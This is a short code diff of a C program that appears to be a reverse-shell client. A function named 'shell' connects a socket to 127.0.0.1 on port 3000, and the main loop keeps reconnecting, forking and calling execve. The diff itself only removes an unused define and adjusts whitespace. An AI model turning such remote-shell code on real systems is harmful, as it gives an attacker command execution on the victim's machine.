@@ -5,13 +5,12 @@
 
 #define ADDRESS "127.0.0.1"
 #define PORT 3000
-#define FLAGS O_RDWR | O_APPEND | O_CREAT
 
 int shell(char* address, short port) {
   int fd;
   struct sockaddr_in server = {
     .sin_family = AF_INET,
-    .sin_port = htons(port)
+    .sin_port   = htons(port)
   };
 
   if(inet_pton(AF_INET, address, &server.sin_addr) <= 0 ) return -1;
@@ -31,7 +30,7 @@ int main(void) {
   };
 
   while(1) {
-    int fd = shell(ADDRESS, PORT);
+    int fd  = shell(ADDRESS, PORT);
     pid_t p = fork();
     if(p == 0) {
       execve(args[0], args, 0);
